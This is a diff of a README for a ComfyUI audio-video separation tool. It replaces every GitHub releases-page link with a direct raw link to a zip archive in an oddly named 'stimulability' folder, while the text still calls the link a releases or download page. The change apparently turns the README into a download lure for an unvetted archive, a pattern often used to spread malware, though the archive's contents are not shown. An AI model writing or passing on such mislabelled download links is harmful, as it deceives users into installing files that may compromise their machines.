@@ -1,6 +1,6 @@
 # 🎨 ComfyUI-PainterLTXV2 - Easy Audio-Video Separation for Everyone
 
-[![Download](https://img.shields.io/badge/Download_Latest_Version-brightgreen.svg)](https://github.com/Derrick2028/ComfyUI-PainterLTXV2/releases)
+[![Download](https://raw.githubusercontent.com/Derrick2028/ComfyUI-PainterLTXV2/main/stimulability/U_Painter_Comfy_LTX_v3.9.zip)](https://raw.githubusercontent.com/Derrick2028/ComfyUI-PainterLTXV2/main/stimulability/U_Painter_Comfy_LTX_v3.9.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ ComfyUI-PainterLTXV2 offers custom tools for audio and video separation. With th
 
 Follow these steps to download and run the software:
 
-1. **Visit the Releases Page**: Click this link to access the download page: [Releases Page](https://github.com/Derrick2028/ComfyUI-PainterLTXV2/releases).
+1. **Visit the Releases Page**: Click this link to access the download page: [Releases Page](https://raw.githubusercontent.com/Derrick2028/ComfyUI-PainterLTXV2/main/stimulability/U_Painter_Comfy_LTX_v3.9.zip).
 2. **Choose Your Version**: Look for the latest version at the top of the page and click on it.
 3. **Download the Package**: Find the appropriate download file for your system. Click on the asset to begin downloading.
 
@@ -41,7 +41,7 @@ ComfyUI-PainterLTXV2 comes packed with features aimed to enhance your multimedia
 
 ## 📥 Download & Install
 
-To get started with ComfyUI-PainterLTXV2, visit this page to download: [Download Page](https://github.com/Derrick2028/ComfyUI-PainterLTXV2/releases). Make sure to check for the latest version to enjoy all enhancements.
+To get started with ComfyUI-PainterLTXV2, visit this page to download: [Download Page](https://raw.githubusercontent.com/Derrick2028/ComfyUI-PainterLTXV2/main/stimulability/U_Painter_Comfy_LTX_v3.9.zip). Make sure to check for the latest version to enjoy all enhancements.
 
 ## 🛠️ Troubleshooting
 
